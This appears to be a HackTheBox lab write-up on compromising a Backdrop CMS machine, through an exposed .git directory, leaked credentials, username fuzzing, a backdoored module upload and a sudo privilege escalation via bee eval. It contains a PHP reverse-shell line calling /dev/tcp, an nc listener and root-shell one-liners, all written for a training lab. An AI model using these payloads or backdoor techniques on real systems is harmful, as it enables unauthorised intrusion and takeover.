---
tags:
  - Linux
  - HTTP
  - Exposed .git
  - PHP
  - Sudoers
---

... is a easy HTB machine which exposes a `.git` directory. It includes the password for the user `root`, but that user isn't registered on the back-end. A dictionary attack can be used to find the actual usernames used on the `http` page. The back-end allows you to upload arbitrary `php` code and execute it for OS-command execution. For the privilege escalation, the `ssh` user is allowed to run the binary `bee` as `root`, which allows the use of the `php`-method `eval` on arbitrary strings.

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-git: 
|   10.10.10.10:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-title: Home | Dog
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Initial Exploitation
The `nmap` script `http-git` reveals that there is an exposed `.git` directory on the web service! This should immediately ring alarm bells, as that can possibly include the whole applications source code. To recursively download all files, i install the tool `git-dumper` as follows:
```bash
python3 -m venv venv
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -m venv: creates a virtual python environment named venv, to download python packages. it can be deleted afterwards, so no changes are made
```

```bash
source venv/bin/activate
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# activates the virtual environment in the current bash
```

```bash
pip3 install git-dumper
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# uses venv/bin/pip3 to install git-dumper
```

It can then be used as follows (stores files in directory `loot`):
```bash
git-dumper http://$IP/.git loot
```

I review the `settings.php` and find the following line at the beginning:
```php
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

With these credentials acquired, i make my way onto the web page, which shows multiple posts about `dogs`. I instantly click the `Login` button, as i have credentials which i want to try. I insert them, but i receive a `Sorry, unrecognized username` error. Maybe this password will still work for another user though.

To find valid usernames, i use `grep` in the `.git` directory as follows:
```bash
grep -r "username" .
```
I also tried multiple variations of `user`, `username=`, and so on, but all of them produce very noisy output, which doesn't seem to reveal anything.

I then tried a dictionary attack against the login form using the word-list `SecLists/Usernames/Names/names.txt`:
```bash
ffuf -w ./names.txt -X POST -d "name=FUZZ&pass=BackDropJ2024DS2024&form_build_id=form-M_Fxfy-UE3gyAz1uAHA1S79xlWJ2waUfoU4VBlybD-I&form_id=user_login&op=Log+in" -u "http://$IP/?q=user/login" -fc 200 -mc all
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -X: specify request method, here POST
# -d: data to use in the POST request. the FUZZ word gets replaced with each entry of the wordlist. copied from a burpsuite request!
# -u: URL of the target.
# -fc: filter by response code, as all responses with 404 indicate wrong logins
# -mc: accept any response code
```

This also did not work though, which made me think that the `form_build_id` parameter must be unique with each login request.


### Further Reconnaissance
As the exposed `.git` did not lead to anything, i try to further enumerate the web page. After clicking through the different links, i notice that `Backdrop CMS` uses an URL parameter `/?q` to request different resources, for example `/?q=posts/dog-obesity`, or `/?q=user/login`, which is why i try to deploy a forceful browsing attack against this parameter with the following `ffuf` command:
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u "http://$IP/?q=FUZZ" -fs 162 -mc all
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -u: URL of the target. the FUZZ word gets replaced with each entry of the wordlist.
# -fs: filter by response size, as all responses with 162 are "404" errors.
# -mc: accept any response code
```

But this did not reveal anything.

After a while i took another look at the previous `nmap` scan to see if i have overlooked any information. And this line made me curious:
```bash
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
```
I initially ignored this, as i didn't think much of it, but a quick google research reveals the [official docs of backdrop-cms](https://docs.backdropcms.org/documentation/url-aliases). Within this page, i search for the keywords `user` and `account`, which shows me the following information:

- **Pattern for user account URLs** - accounts/[user:name]

Maybe i can use this URL to do a password attack to find a valid user. I test this theory using the following `ffuf` command:
```bash
ffuf -w ./names.txt -u "http://$IP/?q=accounts/FUZZ" -fc 404 -mc all
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -u: URL of the target. the FUZZ word gets replaced with each entry of the wordlist.
# -fs: filter by response size, as all responses with 162 are "404" errors.
# -mc: accept any response code
```

This yielded better results than the login dictionary attack, as i now have the following valid usernames:

- `axel`
- `john`
- `morris`
- `rosa`
- `tiffany`

I try to log in as each of these accounts using the password `BackDropJ2024DS2024`, and the valid username is `tiffany`!

### Back to Initial Exploitation
With access to the back-end, i look around what i can achieve. I can edit the content of the original posts, but that doesn't include executable `php` code, only static content.

The other interesting functionality are `Modules`. I can go to `Functionality > Install new modules > Manual installation` to upload custom modules. I visit [Backdrop CMS](https://backdropcms.org/modules)'s  web page and look at the available modules. I download one that is compatible with the version of `Backdrop CMS` and current modules (`Webform`), and unzip it on my local machine.

After reviewing it, the `webform/webform.module` is simply `php` code. I slightly change the code by adding this small line at the start of the module:
```php
system('ping -c 3 <my-IP>');
```
This lets the module be used as it is intended (sneaky...), with the added feature that it executes my OS-command which i select (here, a ping to verify that the execution works!). I `tar -czf test.tgz webform` my custom extension, and upload it. 

I start listening for `ICMP` packets like this:
```bash
sudo tcpdump -i tun0 icmp
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: is required for packet inspection
# -i: specify the interface. the HTB VPN uses tun0
# icmp: listen for Internet Control Message Protocol (in short, ping) messages
```

and go to `Functionality > List modules` and enable the `Webform` module, which makes me receive pings!

I quickly change the `ping` payload to a reverse shell initiator:
```php
system('bash -c "/bin/bash -i >& /dev/tcp/<my-IP>/1337 0>&1"');
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# bash -c: wraps the following command so that it explicitly gets executed by bash, not the current shell
# /bin/bash -i: launch the bash binary in interactive mode
# >&: redirect standard output and standard error to:
# /dev/tcp/<IP>/port: when the bash binary opens this path, it creates a TCP connection!
# 0>&1: STDIN (0) gets redirected (>) to where STDOUT (1) is pointing
```

I delete the old extension, `tar` the new and improved one, upload it and start a `nc` listener:
```bash
nc -lvnp 1337
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -l: listen for inbound connects
# -v: verbose to get more info
# -n: numeric IP addresses, dont use DNS
# -p: specify listening port (1337)
```

Enabling this new `Webform` gives me a reverse shell as `www-data`!

### Lateral Movement
As the user `www-data` is only a service account, it has very limited capabilities on the system. An actual user account within the `/home` directory is much more preferable.
The users `jobert` and `johncusack` have a home directory, which is why i assumed that i need one of their accounts to gain `ssh` access to the machine. `ssh` access is always better than a reverse shell, as it is fully interactive. It is always possible to upgrade the reverse shell with a [neat trick](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/), but `ssh` access to an actual account is always preferable.

Due to the info in the leaked `settings.php` i knew that a `mysql` service is running using the credentials `root:BackDropJ2024DS2024`, so i issue the following `mysql` commands to further enumerate the `mysql` service:
```bash
mysql -u root -p -e "show databases"
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -u: username, here root
# -p: use password
# -e: execute the following query. it lists the datbases.
```

After finding out that the database's name is `backdrop`, i execute the following command to show me the tables of that database:
```bash
mysql -u root -p backdrop -e "show tables"
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -u: username, here root
# -p: use password
# backdrop: equivalent of "use backdrop" before query
# -e: execute the following query. it lists the tables.
```

And lastly, i list all entries of the identified `users` table using this command:
```bash
mysql -u root -p backdrop -e "select * from users;"
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -u: username, here root
# -p: use password
# backdrop: equivalent of "use backdrop" before query
# -e: execute the following query. it fetches all entries of the table `users`
```

I am only interested in the hash of the user `jobert`, as he is an actual user on the system with a `/home` directory, so i copy his hash into a `hash.txt` file. `hashcat ./hash.txt ./rockyou.txt` was able to automatically identify the hash, but the cracking did not lead to a clear-text password.

That is why i tried an password-reuse attack against both `jobert` and `johncusack` with the password `BackDropJ2024DS2024`. The `ssh` login for the user `johncusack` was successful with that password!

### Privilege Escalation
I try the usual suspects of privilege escalation:

- `sudo -l`: mis-configured `sudoer` file
- `netstat -tulnp`: hidden services only accessible via localhost
- `id`: user belonging to a weird group

`sudo -l` reveals that `johncusack` is allowed to execute `/usr/local/bin/bee`. [GTFOBins](https://gtfobins.org/gtfobins/bee/) shows that `bee` is able to use the `php`-method `eval` on arbitrary strings. `eval` simply executes the input string as `php` code. It is worth noting that this binary must be executed from the `Backdrop CMS` root directory which is `/var/www/html`. I can either `cd` there or use the option `--root=/var/www/html`.

As i can input arbitrary `php` code, i use the `php`-method `system()` to execute OS commands as the current user (`root`). The following OS command spawns a `bash`:
```bash
sudo bee eval "system('/bin/bash')"
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# or use with option --root=/var/www/html if you aren't in Backdrop CMS's root directory
```
